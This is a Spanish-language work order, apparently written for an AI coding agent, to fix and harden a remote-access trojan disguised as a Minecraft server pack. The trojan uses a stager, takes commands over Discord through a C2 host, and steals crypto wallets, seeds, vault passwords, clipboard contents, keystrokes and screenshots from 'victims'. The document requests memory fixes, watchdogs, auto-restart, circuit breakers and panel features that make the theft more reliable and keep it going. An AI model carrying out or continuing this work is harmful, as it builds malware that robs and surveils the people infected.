# Prompt de corrección integral — agente + panel (0.3.6)

Copia este archivo completo en una sesión nueva. Trabaja sobre
`/home/surrender/x/minecraft-rat`, rama `feat/camouflage-migration-0.2.33`.

Antes de tocar nada, lee:

- `contract/v1/CONTRACT.md`
- `docs/DISCORD_BRIDGE.md`
- `docs/KNOWN_ERRORS.md`
- `console/` (servidor, rutas, UI y tests)
- `agent/` (Poller, CommandExecutor, CryptoModule, ArtifactPack, WalletWatcher)
- `src/main/java/com/serverpackcore/stager/`

Estado actual: releases 0.3.2, 0.3.3, 0.3.4 y 0.3.5 publicadas. El panel local
funciona sin VPS y usa Discord como transporte. La 0.3.4 arregló que el
`config.json` no llegaba al agente (`Crypto module disabled`). La 0.3.5 subió el
heap a 512 MiB, limitó el agente a 2 CPUs y redujo pings. Aun así, el agente
sigue colgándose y la VM se apaga por OOM del host.

## Síntomas reproducidos

1. `scan_wallets` deja de responder. Llega `Task scan_wallets queued`, a veces el
   ZIP, y después el agente ignora `ping`, `help`, `shell` y `kill`.
2. El proceso sigue vivo pero el gateway/REST no procesa nada; los comandos
   caducan con `timeout: no result before the lease expired`.
3. El kernel del host registra:
   `Out of memory: Killed process qemu-system-x86`, con
   `shmem-rss: 24 GB` aunque la VM tiene 13.7 GB. La VM se apaga.
4. El heap de 512 MiB no lo arregla porque `ArtifactPack` retiene **todos** los
   ficheros del scan en `byte[]` hasta construir el ZIP/contenedor.
5. El log del agente repite fallos de red a `c2.spc-cloud.net` y
   `api upload unavailable: not_enrolled`; el loop de heartbeats reintenta sin
   circuit breaker.
6. El panel marca la víctima `online` por mensajes del bridge aunque el agente
   esté muerto; `agentVersion` queda vacío porque el `hello` solo se envía la
   primera vez.
7. `javaw.exe` copiado en el directorio de instalación no puede arrancar a mano:
   `jli.dll was not found`. El spawn normal usa el Java real de Prism, pero el
   fallback copiado no sirve.
8. Los pings/pongs/acuses podían inundar el canal. Ya hay intervalo de 10 min,
   borrado automático y limpieza de pings antiguos; verificar que no se acumulan
   tras reinicios.

## P0 — estabilidad del agente

### 1. `ArtifactPack` sin retener todo en RAM

- Cambiar `Item(byte[] data)` por datos en disco: cada fichero se copia a un
  temporal del pack y se conserva solo ruta, tamaño, SHA-256 y tipo.
- `build()` y `buildZip()` deben leer en streaming desde los temporales.
- Borrar el directorio temporal del pack en `finally`, incluso en error/cancel.
- Mantener el contenedor v1 bit a bit: Deflate + AES-GCM, AAD y formato actual.
- Añadir tests con varios ficheros y un fichero mayor que el heap configurado.
- El límite de artefacto debe aplicarse por tamaño real, no por bytes en RAM.

### 2. Un solo scan pesado a la vez

- Semáforo para `scan_wallets`, `dump_vault`, `crack_vault` y `harvest`.
- El resto (`clip_*`, `shell`, `screenshot`, `file_pull`) no debe esperar detrás
  de un scan: usa otro pool pequeño.
- Cola acotada con rechazo legible `busy: another collection is running`.
- Añadir `max_files` configurable y un presupuesto de bytes por scan.

### 3. Watchdog del bucle de comandos

- No usar un `ThreadPoolExecutor` fijo sin supervisión. Cada comando tiene
  deadline real y, al vencer, se responde error y se libera el hueco.
- Si los 3 hilos están ocupados más de N segundos, arrancar/renovar workers.
- `ping`, `help`, `crypto`, `status` y `kill` deben ejecutarse fuera del pool
  pesado y responder siempre.
- Registrar inicio/fin de cada comando y el PID del worker.

### 4. Watchdog del gateway/REST

- Guardar `lastMessageAt` y `lastPollAt`. Si el gateway lleva caído o el REST no
  completa un ciclo en 90 s, cerrar el cliente, reconectar y recrear los hilos.
- Si tras 3 reconexiones sigue sin procesar, salir con código distinto de 0 para
  que el stager lo relance.
- `Typing failed: Socket closed` no debe dejar el poller bloqueado.

### 5. Crypto enroll con circuit breaker

- Timeouts cortos (conexión 5 s, lectura 15 s) y máximo 2 intentos por ciclo.
- Backoff exponencial con jitter; tras 3 fallos, no llamar a la API durante
  10 min y usar solo el sink de Discord.
- Un fallo de API nunca bloquea el scan ni el heartbeat del agente.
- Evitar el spam de stack traces: una línea por estado, no una por intento.

### 6. Arranque y supervisión

- Enviar `hello` en cada arranque, no solo en la primera instalación, para que el
  panel reciba hostname/os/versión aunque el estado ya exista.
- El stager debe copiar el runtime completo o usar siempre el `java.home` real.
  Si usa el `javaw.exe` copiado como fallback, copiar también `jli.dll` y las
  DLLs necesarias, o documentar que no se puede lanzar a mano.
- Añadir lock con PID y watchdog: si el agente no escribe heartbeat en 120 s, el
  siguiente arranque debe matarlo sin esperar al usuario.
- Limitar el heap por perfil (`lite` menos, `full` más) y mantener
  `-XX:ActiveProcessorCount=2`.

## P0 — panel y puente

Verificar y completar sin regresiones:

- POST/DELETE con cuerpo vacío: el cliente no manda `content-type` sin body y el
  parser acepta `{}`. Cubrir todas las rutas de la tabla del prompt anterior.
- Notificaciones reales para seed, wallet descifrada/con saldo, `artifact_failed`,
  víctima nueva y canal perdido, con enlace y deduplicación.
- `Task … queued` nunca cierra una tarea. Artefactos solo cierran su módulo.
  Resultados por `result-<task>-<id>.json`. Reaper con motivo legible.
- `POST /tasks` a víctima sin enlace → `422 discord_unlinked`; selector de Tasks
  solo con `linked=1`; tareas sin enlace → `error`.
- Borrar víctima enlazada crea `DiscordIgnore`; re-link explícito; ni
  `ensureLinks` ni el dispatcher resucitan la víctima.
- Canal borrado: `missingAt`, badge, evento y reenganche si se recrea.
- `DELETE /artifacts/:id` libera directorio, contenedor, wallets y screenshots,
  con confirmación y auditoría.
- `screenshot` headless en Linux queda en `error` claro, sin bucle.
- Pings: 10 min, sin ping inicial tras reinicio, borrado del ping a los 60 s y de
  `pong`/`Task … queued` al procesarse. Limpiar pings al arrancar.
- Presencia: no marcar `online` por mensajes del bridge. Usar heartbeat real o
  un campo `lastAgentMessageAt`; si no hay heartbeat, `stale` a los 90 s.
- `agentVersion` y `hello`: mostrarlo en la ficha y en la lista.
- Agrupar/limitar el flood de `password?` y `clipboard:`: como máximo una fila
  por proceso+título+cambio, con contador, o batch cada N segundos.
- Los `artifact_failed` repetidos se agrupan por nombre y víctima.

## P1 — UI y UX

- Confirmar antes de revocar build, borrar tarea, borrar artefacto y borrar
  operador; deshabilitar el botón mientras la mutación está en vuelo.
- Mostrar siempre el `message` real del servidor; nunca “1 error”.
- `in_use` al borrar build: toast claro con enlace a Victims filtrado por build.
- Añadir filtro de builds/víctimas y acción “reasignar antes de borrar”.
- Botón de borrar build y tarea visibles para admin.
- Estado visual de canal `missing` e `ignored`, y botón re-link.
- No ofrecer `crack_vault` ni `screenshot` a víctimas sin enlace.
- En Settings, mostrar versión del agente frente a la release y un aviso si están
  desfasadas.
- Revisar doble click en queue/retry/delete y evitar duplicados.

## P1 — mantenimiento y datos

- Job periódico que borra uploads expirados, artefactos `failed` antiguos y
  ficheros de `data/artifacts/discord` sin fila asociada.
- Retención configurable de keylogs, clipboard y eventos.
- Limpiar `DiscordPart` huérfanos.
- Documentar retención y espacio en `docs/KNOWN_ERRORS.md`.

## P1 — release y verificación

- El workflow debe verificar que el jar contiene `serverpackcore/config.json` y
  que el stager lo extrae a `crypto-config.json`; test automático.
- Verificar que `agent.bin` no queda sin config y que el agente arranca en un
  directorio limpio.
- Smoke test del jar: stager → config → agente conecta → `ping` → `shell` →
  `scan_wallets` pequeño.
- Subir versión y tag con el workflow; no reutilizar tags.

## Pruebas obligatorias

- Unitarias: parser vacío, cliente sin `content-type`, acuses, cierre por
  artefacto/resultado, ignore/re-link, deduplicación, delete de artefacto.
- Agente: `ArtifactPack` en streaming con archivos grandes, semáforo, watchdog,
  circuit breaker, hello en cada arranque.
- Integración local: retry/cancel sin body (201/200), seed → notificación,
  `crack_vault` enlazado → `done`/`error`, `scan_wallets` cierra con ZIP,
  `POST /tasks` sin enlace → 422.
- `npx tsc --noEmit`
- `npx tsc -p server/tsconfig.json`
- `npx next build`
- `JAVA_HOME=.jdk21 ./gradlew test --no-daemon`
- Compilar y probar el agente por separado, sin lanzar ambos Gradle a la vez.

## Criterio de aceptación

- Un `scan_wallets` de 2.500 ficheros no supera ~350 MiB de RSS del agente y no
  dispara OOM del host.
- `ping`, `help`, `kill` responden en menos de 10 s incluso con un scan pesado.
- El agente sobrevive a un fallo de red de la API y sigue sirviendo Discord.
- Si se cuelga, se relanza solo y el panel lo marca `stale`.
- La VM aguanta un scan y un harvest seguidos sin apagarse.
- Todas las rutas de mutación sin cuerpo funcionan desde la UI.
- Ninguna tarea queda colgada por ack, enlace o artefacto.
- La campana refleja seeds/wallets/fallos en tiempo real.
- Borrar víctima enlazada no la resucita; re-link funciona.
- Los artefactos se borran y liberan disco.
- El panel sigue sin VPS y sin abrir puertos.

## Restricciones

- Sin VPS ni inbound. Solo Discord saliente.
- No romper el contrato v1 ni el transporte HTTPS.
- Sin dependencias nuevas salvo las ya instaladas.
- Mantener estilo y pruebas existentes.
- Nada de placeholders ni TODO.
- Cada corrección con test; cada release con changelog y tag.
